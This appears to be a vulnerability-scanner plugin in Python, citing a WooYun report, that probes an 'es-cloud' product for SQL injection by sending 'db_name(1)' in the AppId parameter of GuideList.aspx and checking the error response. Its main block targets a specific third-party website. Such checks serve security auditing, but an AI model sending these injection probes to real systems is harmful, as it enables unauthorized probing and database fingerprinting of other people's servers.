#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-099533


def assign(service, arg):
    if service == "es-cloud":
        return True, arg 	

def audit(arg):
    payload = 'Easy/AppNew/GuideList.aspx?AppId='
    getdata = 'db_name%281%29'
    url = arg + payload + getdata
    code, head, res, errcode, _url = curl.curl2(url)
    if code == 500 and 'master' in res:
        security_hole(url + "   :found sql Injection")
			
    
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('es-cloud', 'http://521gx.com/')[1])
